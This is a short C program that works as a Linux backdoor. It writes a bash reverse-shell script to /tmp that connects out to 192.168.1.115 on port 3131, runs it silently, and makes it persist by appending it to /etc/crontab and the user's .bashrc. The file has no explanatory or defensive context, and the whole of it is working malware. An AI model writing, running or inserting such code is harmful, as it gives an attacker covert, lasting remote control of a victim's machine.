#include <stdio.h>

int main(int argc, char **argv)
{

char *ware[200];
char *ware1[200];
char *ware2[200];

		strcpy(ware , "touch /tmp/sistem.sh; echo '0<&50-;exec 50<>/dev/tcp/192.168.1.115/3131;sh <&50 >&50 2>&50' >> /tmp/sistem.sh ; bash /tmp/sistem.sh > /dev/null 2>&1");
		system(ware);

		strcpy(ware1 , "echo '* * 1 * root bash /tmp/sistem.sh > /dev/null 2>&1' >> /etc/crontab");
		system(ware1);

		strcpy(ware2 , "echo '\nbash /tmp/sistem.sh > /dev/null 2>&1' >> /home/$USER/.bashrc");
		system(ware2);



	return 0;
}
